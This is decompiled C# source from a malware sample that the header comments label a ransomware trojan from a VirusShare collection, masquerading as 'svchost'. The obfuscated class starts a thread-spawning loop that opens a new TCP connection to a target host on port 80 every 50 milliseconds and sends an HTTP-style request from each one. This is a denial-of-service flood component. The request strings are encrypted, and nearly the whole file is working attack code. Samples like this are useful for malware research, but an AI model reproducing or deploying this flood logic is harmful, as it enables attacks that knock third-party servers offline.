// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0006
{
  public static Thread \u0002;
  public static string \u0003;
  public static bool \u0005;

  public static void \u0002()
  {
    \u0006.\u0005 = true;
    \u0006.\u0002 = new Thread(new ThreadStart(\u0006.\u0005));
    \u0006.\u0002.Start();
  }

  public static void \u0003()
  {
    \u0006.\u0005 = false;
    \u0006.\u0002.Abort();
  }

  public static void \u0005()
  {
    ThreadStart threadStart = (ThreadStart) null;
    \u0006.\u0002 obj = new \u0006.\u0002();
    ThreadStart start = (ThreadStart) null;
    obj.\u0002 = new List<TcpClient>();
    while (\u0006.\u0005)
    {
      if (start == null)
      {
        if (threadStart == null)
          threadStart = new ThreadStart(obj.\u0002);
        start = threadStart;
      }
      new Thread(start).Start();
      Thread.Sleep(50);
    }
    foreach (TcpClient tcpClient in obj.\u0002)
    {
      try
      {
        tcpClient.GetStream().Dispose();
      }
      catch (Exception ex)
      {
      }
    }
  }

  private sealed class \u0002
  {
    public List<TcpClient> \u0002;

    public void \u0002()
    {
      TcpClient tcpClient = new TcpClient();
      this.\u0002.Add(tcpClient);
      try
      {
        tcpClient.Connect(\u0006.\u0003, 80);
        StreamWriter streamWriter = new StreamWriter((Stream) tcpClient.GetStream());
        streamWriter.Write(\u0008\u2003.\u0002(415305772) + \u0006.\u0003 + \u0008\u2003.\u0002(415305738));
        streamWriter.Flush();
      }
      catch (Exception ex)
      {
      }
    }
  }
}
